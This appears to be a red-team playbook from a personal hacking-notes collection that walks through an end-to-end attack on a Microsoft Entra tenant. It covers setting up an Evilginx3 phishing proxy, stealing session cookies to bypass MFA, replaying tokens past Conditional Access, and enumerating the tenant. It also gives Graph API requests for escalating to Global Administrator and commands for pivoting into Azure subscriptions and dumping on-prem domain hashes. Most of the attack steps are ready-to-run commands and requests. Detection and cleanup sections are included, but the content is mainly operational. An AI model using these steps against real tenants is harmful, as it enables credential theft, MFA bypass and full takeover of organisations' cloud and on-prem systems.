---
tags:
  - hack-notes
  - playbook
  - azure
  - entra
---

# Azure AiTM Token Theft to Global Admin Playbook

> Phish a user through an adversary-in-the-middle proxy to steal a live Entra session token and bypass MFA, replay it, enumerate the tenant, and ride an app or role primitive up to Global Administrator, then pivot into Azure and on-prem.

> **Attack graph position**
> **Fed by:** [Device Code Phishing to M365 Takeover](Device%20Code%20Phishing%20to%20M365%20Takeover.md); [DCSync to Golden Ticket Persistence](DCSync%20to%20Golden%20Ticket%20Persistence.md) (on-prem to cloud bridge via Entra Connect / seamless SSO).
> **Feeds into:** On-prem AD via Entra Connect: [Coercion to ADCS ESC8 to Domain Admin](Coercion%20to%20ADCS%20ESC8%20to%20Domain%20Admin.md), [Kerberoasting to Domain Admin](Kerberoasting%20to%20Domain%20Admin.md). End state: Entra Global Admin.
> Full chain map: [Attack Graph](Attack%20Graph.md)

## Scenario at a Glance
| | |
|---|---|
| Goal | Full Entra ID tenant compromise (Global Administrator) starting from zero foothold |
| Starting position | External attacker with a phishing lure and a registered look-alike domain. No credentials. |
| End state | Global Administrator, then pivot to Azure subscriptions and on-prem via Entra Connect |
| Key techniques | T1557 AiTM, T1528 steal app access token, T1621 MFA request generation, T1098.001 additional cloud credentials, T1484.002 trust modification, T1078.004 valid cloud accounts |
| Prerequisites | Target uses Entra ID with password+MFA (not phishing-resistant FIDO2/passkey for all users). At least one Conditional Access gap or a phishable user. |
| Difficulty | Medium |
| Noise level | Moderate to Loud (sign-in logs, risky-sign-in, audit logs for SP credential add and role assignment all fire) |

## Attack Path
```
  Lure -> Evilginx3 AiTM proxy (login.microsoftonline.com phishlet)
            |
            v
  Victim authenticates + completes MFA on the proxy
            |
            v
  Capture ESTSAUTH* session cookie + access/refresh tokens
            |
            v
  Replay token from attacker box (roadrecon / GraphRunner / TokenSmith)
            |
   +--------+--------------------------------+
   |  CA BLOCKS replay (IP / device / state) |
   |        |                                |
   |        v                                |
   |  Branch A: device-code phishing         |
   |  Branch B: PRT theft (compliant device) |
   |  Branch C: TokenSmith --intune-bypass   |
   +--------+--------------------------------+
            |
            v
  Enumerate tenant (roadrecon gather + gui, Invoke-GraphRecon)
            |
            v
  Find privesc primitive:
    - app/SP credential add (App Admin / Cloud App Admin / Application.ReadWrite.All)
    - owner-of-privileged-app
    - role-eligible PIM (self-activate)
    - dynamic-group injection (attribute self-edit)
            |
            v
  Escalate to Global Administrator
            |
            v
  Pivot: Azure RBAC (elevate access toggle) + on-prem via Entra Connect / DCSync
```

## Prerequisites and Setup
- Registered look-alike domain with valid TLS (LetsEncrypt via Evilginx autocert), aged a few days if possible.
- VPS for Evilginx3 (current `master`, Go build). Open 443/80, point an A record at it.
- Attacker tooling box (Linux) with:
  - `pipx install roadtools roadtools_auth` (gives `roadrecon` and `roadtx`).
  - `git clone https://github.com/dafthack/GraphRunner` (PowerShell 7 / pwsh).
  - `git clone https://github.com/JumpsecLabs/TokenSmith` and build, or grab a release binary.
  - AADInternals: `Install-Module AADInternals` in pwsh.
- A throwaway "attacker" Entra tenant (free) for actor-token style tricks and for hosting a malicious multi-tenant app for consent abuse.
- Recon the target first: `Invoke-AADIntReconAsOutsider -Domain corp.com` to confirm the tenant is managed (not federated), grab the tenant id, and see which auth flows are live before you burn the lure.

## Walkthrough

### Step 1. Recon the tenant as an outsider
What and why: confirm Entra is in play, get the tenant id, and learn whether the org is managed or federated before committing the phish. Federated targets change the endgame (you forge SAML instead).
```powershell
Import-Module AADInternals
Invoke-AADIntReconAsOutsider -Domain corp.com | Format-Table
# tenant brand, tenant id (GUID), DNS/MX, whether managed vs federated, MDI presence
Get-AADIntLoginInformation -UserName victim@corp.com
# returns "Desktop SSO Enabled", account type, throttle hints
```
Success signal: you get a tenant GUID and `Managed` (cloud auth). Note the tenant id, you reuse it everywhere.

### Step 2. Stand up the Evilginx3 AiTM proxy
What and why: Evilginx is a transparent reverse proxy. The victim talks to your domain, you relay to `login.microsoftonline.com`, and you skim the session cookie the IdP issues AFTER MFA succeeds. That cookie is a fully authenticated session, so you inherit the MFA state.
```bash
# on the VPS
sudo ./evilginx3 -p ./phishlets
# inside the evilginx console:
config domain login.corp-sso.com
config ipv4 <vps-public-ip>
# load a current M365/Entra phishlet (community-maintained, the built-in o365 lags)
phishlets hostname o365 login.corp-sso.com
phishlets enable o365
# create the lure
lures create o365
lures get-url 0
```
Success signal: `lures get-url 0` prints a HTTPS URL. Hitting it shows a pixel-perfect Microsoft login proxied live, with a valid cert.
Decision: if the org enforces phishing-resistant MFA (FIDO2/passkey) tenant-wide, the AiTM cookie capture will fail at the WebAuthn step. Jump to Variations -> device-code phishing, which does not relay WebAuthn.

### Step 3. Capture the session token
What and why: when the victim finishes login+MFA, Evilginx logs the `ESTSAUTH` / `ESTSAUTHPERSISTENT` cookies and any tokens. Those are your replay material.
```bash
# in the evilginx console after a catch:
sessions
sessions 1
# copy the captured tokens / ESTSAUTHPERSISTENT cookie blob
```
Success signal: the session row shows `captured` with cookies present. Export the cookie JSON.
Decision: Evilginx gives you the session cookie. To turn it into portable access+refresh tokens for the API tooling, feed the cookie into TokenSmith or roadtx rather than driving a browser.

### Step 4. Turn the cookie into replayable tokens
What and why: API tooling wants OAuth access/refresh tokens, not a browser cookie. TokenSmith redeems the `ESTSAUTHPERSISTENT` cookie into tokens that drop straight into ROADtools and GraphRunner.
```bash
# TokenSmith: import the captured persistent cookie, get tokens out
./tokensmith authcode --cookie 'ESTSAUTHPERSISTENT=<blob>'
# or interactive: ./tokensmith authcode  then paste the redirected code URL
# add --intune-bypass / -i to request tokens as if from a compliant device
```
Alternative with roadtx (cookie or full interactive flow):
```bash
roadtx browserprtauth --cookie '<estsauth>' --tokens-stdout
# or a clean interactive auth if you have creds:
roadtx interactiveauth -u victim@corp.com -p '<pass>'
```
Success signal: you hold a JSON with `accessToken` + `refreshToken` (and a `.roadtools_auth` cache for roadrecon). The refresh token is the durable asset, access tokens live 60-90 minutes.
Decision branch (token replay blocked): if the first authenticated call returns `AADSTS50076`/`AADSTS53003` (CA requires MFA again or blocks the IP/device), the cookie alone is not enough from your box. Go to Variations: device-code phishing (Branch A), PRT theft on a compliant device (Branch B), or TokenSmith `--intune-bypass` to pose as a compliant device (Branch C).

### Step 5. Validate and refresh the token
What and why: confirm the token is alive and scoped before you make noise, and set up auto-refresh so you do not lose access mid-enumeration.
```powershell
# GraphRunner
. ./GraphRunner.ps1
Invoke-ImportTokens -AccessToken <tok> -RefreshToken <rtok>
Invoke-RefreshGraphTokens          # mint a fresh access token from the RT
Invoke-AutoTokenRefresh            # keep it alive in the background
```
Success signal: `Get-GraphTokens`-backed calls return your identity. Decode the access token at jwt.io: check `aud` (should be `graph.microsoft.com` or `00000003-0000-0000-c000-000000000000`), `scp` (delegated scopes), and `amr` (shows `mfa` so CA sees you as MFA-satisfied).

### Step 6. Enumerate the tenant
What and why: pull the full directory to map who is privileged, which apps/SPs you can touch, what CA policies gate you, and where the escalation primitive is.
```bash
# ROADtools: gather the whole tenant into a local SQLite db, then browse it
roadrecon gather
roadrecon gui      # http://127.0.0.1:5000  map roles, SPs, app owners, dynamic groups
```
```powershell
# GraphRunner one-shot recon
Invoke-GraphRecon -PermissionEnum    # org info, user settings, dir-sync settings
Invoke-DumpCAPS -ResolveGuids        # all Conditional Access policies (find your replay block)
Invoke-DumpApps                      # app registrations, grants, resolved permissions, owners
Get-DirectoryRoles                   # who holds GA, Priv Role Admin, App Admin, etc.
Get-AzureADUsers -OutFile users.txt
```
Success signal: a populated roadrecon db and a clear list of role holders. In the GUI, sort `ServicePrincipals` and `Applications` by your-user-is-owner, and check `Roles` for any PIM-eligible assignment on your identity.
Decision: the `Invoke-DumpCAPS` output tells you exactly which policy blocked Step 4 (named locations, device filters, app-specific grants). Use it to pick the right bypass branch.

### Step 7. Find the privilege-escalation primitive
What and why: GA is reached through one of a few recurring primitives. Pick whichever the enumeration handed you, in rough order of reliability.

Primitive A: app / SP credential add (you hold App Admin, Cloud Application Administrator, or `Application.ReadWrite.All`). These roles let you add a secret/cert to a service principal and then authenticate AS that SP, inheriting its (often over-broad) app permissions.
```http
POST https://graph.microsoft.com/v1.0/servicePrincipals/{sp-id}/addPassword
Authorization: Bearer <your-token>
Content-Type: application/json

{ "passwordCredential": { "displayName": "win" } }
```
Then authenticate app-only as that SP:
```bash
roadtx gettokens --client {appId} --secret <newsecret> --tenant <tenantid> -r https://graph.microsoft.com
```
If the SP holds `RoleManagement.ReadWrite.Directory` or `AppRoleAssignment.ReadWrite.All`, you can now grant yourself a directory role or app role (see Step 8). Historically the Office 365 Exchange Online SP was the classic target (it carried `Domain.ReadWrite.All`, enabling a rogue federated domain and SAML forgery), though that specific path was tightened by Microsoft in Aug 2025. The general primitive (add credential to an over-permissioned SP) remains live whenever such an SP exists.

Primitive B: owner-of-privileged-app. If you own an app/SP that holds a high-privilege Graph role, add a credential to it (same `addPassword`) and inherit the role. roadrecon GUI shows ownership directly.

Primitive C: PIM role-eligible. If your phished user is eligible for a privileged role, self-activate it.
```http
POST https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignmentScheduleRequests
{ "action":"selfActivate", "principalId":"<you>",
  "roleDefinitionId":"62e90394-69f5-4237-9190-012177145e10",  # Global Administrator
  "directoryScopeId":"/", "justification":"maint" }
```

Primitive D: dynamic-group injection. A dynamic group whose rule keys off a user-editable attribute (department, otherMail, etc.) and which grants access (or is assigned a role / app) can be entered by editing your own attribute.
```http
PATCH https://graph.microsoft.com/v1.0/users/{you}
{ "department": "PrivilegedTeam" }   # matches the dynamic rule -> auto-added -> inherit access
```
Success signal: for A/B you get an app-only token for the privileged SP; for C/D you appear in the target role/group on the next directory read.

### Step 8. Escalate to Global Administrator
What and why: with `RoleManagement.ReadWrite.Directory` (held directly, via the SP from Step 7, or via PIM), assign GA to an identity you control.
```http
POST https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments
Authorization: Bearer <privileged-token>
Content-Type: application/json

{ "principalId": "<attacker-controlled-user-or-sp>",
  "roleDefinitionId": "62e90394-69f5-4237-9190-012177145e10",
  "directoryScopeId": "/" }
```
Success signal: `Get-DirectoryRoles` (or `roadrecon gui` -> Roles) now lists your principal under Global Administrator. Verify with a GA-only read, e.g. enumerate all CA policies including the locked ones.

### Step 9. Pivot to Azure resources and on-prem
What and why: GA is an Entra role, not an Azure RBAC role, but a GA can grant itself Azure access, then reach subscriptions and any on-prem sync server.
```bash
# Toggle "Access management for Azure resources" -> grants GA User Access Admin at root scope
az rest --method post \
  --url "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01"
az role assignment create --assignee <you> --role Owner --scope /subscriptions/<subid>
az login --service-principal ... ; az vm run-command invoke ...   # land on VMs
```
On-prem pivot via Entra Connect: the sync server holds the `MSOL_` AD account with DCSync rights. Compromise that host (or abuse a hybrid-joined device) and:
```bash
# from a foothold on the sync server / DC reachable host
netexec smb dc01.corp.local -u MSOL_<id> -p '<recovered>' --ntds   # or impacket secretsdump
```
Success signal: Owner on a subscription and/or DCSync of the on-prem domain. You now own cloud and on-prem.

## OPSEC and Detection
- Entra sign-in logs (`SigninLogs`): token replay from your VPS lights up impossible-travel, new-device, and unfamiliar-location risk. The `amr=mfa` claim is inherited, so it reads as "MFA satisfied" but from a new IP/ASN. Identity Protection raises a risky sign-in.
- Audit logs (`AuditLogs`): `Update application - Certificates and secrets management` and `Add service principal credentials` fire on Step 7 Primitive A/B. `Add member to role` / `Add eligible member to role` fire on Step 8. These are the loudest events in the whole chain.
- Device-code branch: `Entra ID OAuth Device Code Grant by unusual user` and the `deviceCodeFlow` value in sign-in logs. Microsoft shipped a managed CA policy to block device-code flow in 2025, so it may simply fail.
- PRT branch: roadtx registers devices as `DESKTOP-########` on OS `10.0.19041.928`. A new device-registration audit event plus that naming pattern is a tell. `RT to PRT transition from same user and device` is a published detection.
- MDE/MDCA: anomalous Graph enumeration (mass `Get-AzureADUsers`, full `roadrecon gather`) and SP credential abuse surface as alerts. The Azure `elevateAccess` call writes to the Azure Activity log and is rare/high-signal.
- Noise reduction: refresh from a residential/ASN-matched egress, scope tokens narrowly, pace enumeration (skip `Invoke-GraphRunner` shotgun reads), reuse an existing app id rather than registering a new one, and prefer PIM self-activation (Primitive C) over a fresh role assignment when available, as it can look like normal admin behavior.
- Note on CVE-2025-55241 (actor tokens): the patched cross-tenant actor-token path was uniquely stealthy (no sign-in logs, CA/MFA bypass, no revocation). It is fixed (reported 14 Jul 2025, patched 17 Jul 2025). Do not rely on it on a current tenant. Mentioned here only as the recent reference point for "logless" token abuse.

## Cleanup
- Remove any SP/app credential you added: `DELETE /servicePrincipals/{id}/removePassword` (or `removeKey`) with the `keyId` you created in Step 7.
- Revoke any role assignment you created: `DELETE /roleManagement/directory/roleAssignments/{assignmentId}` (the GA grant from Step 8) and deactivate any PIM activation.
- Revert dynamic-group attribute edits: `PATCH /users/{you}` setting the attribute back to its original value so you fall out of the group.
- Remove any consented app / OAuth grant (`Invoke-InjectOAuthApp` artifacts), guest invites (`Invoke-InviteGuest`), and cloned groups (`Invoke-SecurityGroupCloner`) if you used GraphRunner persistence.
- Delete any registered device (roadtx PRT branch) from Entra devices.
- Undo the Azure `elevateAccess` toggle and remove the Owner role assignment you added.
- Tear down the Evilginx VPS, retire the look-alike domain, and clear captured sessions. Tokens themselves expire, but revoke refresh tokens via `Revoke-AADIntUserRefreshTokens` style action only if the engagement scope allows touching the victim account.

## Troubleshooting
- `AADSTS50076` / `AADSTS53003` on replay: CA requires MFA or blocks your IP/device. The cookie's MFA state did not carry. Use the device-code or PRT branch, or TokenSmith `--intune-bypass` to present as compliant. Check `Invoke-DumpCAPS` to see the exact gating policy.
- `AADSTS65001` / consent required: the client id you requested lacks the scope. Switch to a first-party client that already has broad consent (e.g. the Azure CLI or Teams client id) via roadtx `--client`.
- Wrong audience: the stolen token is scoped to `graph.microsoft.com` but you call the ARM (`management.azure.com`) or legacy Azure AD Graph endpoint. Use the refresh token to mint a new access token for the correct resource (`roadtx gettokens -r <resource>` or `Invoke-RefreshGraphTokens`).
- Access token expired (60-90 min): refresh with `Invoke-RefreshGraphTokens` / `roadtx refreshtokenexpiration`. If the refresh token itself was revoked (admin reset password / revoked sessions), re-phish.
- `roadrecon gather` returns sparse data: the token is for a guest or a low-priv user with restricted directory reads. Confirm `scp` includes `Directory.Read.All` or fall back to `-mg` Graph mode.
- SP credential add returns 403: your role is scoped or the SP has an app property lock. Try a different over-permissioned SP from `Invoke-DumpApps`, or an app you own outright.
- Evilginx shows a blank/blocked page: the phishlet is stale (Microsoft changed login JS), or the domain is already categorized. Update the community phishlet and rotate the domain.

## Variations and Pivots
- Branch A, device-code phishing: instead of an AiTM proxy, send the victim a real Microsoft device-code prompt. No look-alike domain, no WebAuthn relay problem, the login happens on `microsoft.com`. See [Device Code Phishing to M365 Takeover](Device%20Code%20Phishing%20to%20M365%20Takeover.md) for the full flow. Start it with AADInternals `Invoke-AADIntPhishing` or GraphRunner `Get-GraphTokens -DeviceCode`, relay the code to the victim, and collect tokens on success.
- Branch B, PRT theft: if you land code execution on an Entra-joined/hybrid endpoint, extract the Primary Refresh Token + session key and mint tokens that look like they come from a compliant, managed device, sidestepping device-based CA. Use roadtx `prtcookie` / register a device then derive the PRT cookie.
- Branch C, compliant-device pose: TokenSmith `authcode --intune-bypass` requests tokens as though from a compliant device, beating device-filter CA without owning a real one.
- Federated target: if Step 1 shows the domain is federated, skip Graph privesc and go straight for the ADFS/token-signing key on-prem (Golden SAML) once you have a foothold.
- Persistence after GA: register a multi-tenant app with broad app permissions and admin-consent it, add a secondary federated credential, or seed a backdoor SP credential, so you survive a single-token revocation.
- Cross into [Phishing and Social Engineering](../Checklists/Phishing%20and%20Social%20Engineering.md) for lure delivery and pretext, and into the Azure post-exploitation breadth at [Azure and M365 Entra ID](../Checklists/Azure%20and%20M365%20Entra%20ID.md).

## Related
- [Azure and M365 Entra ID](../Checklists/Azure%20and%20M365%20Entra%20ID.md)
- [Azure and Entra ID](../Cheatsheets/Azure%20and%20Entra%20ID.md)
- [Phishing and Social Engineering](../Checklists/Phishing%20and%20Social%20Engineering.md)
- [Device Code Phishing to M365 Takeover](Device%20Code%20Phishing%20to%20M365%20Takeover.md)
- Ariadne
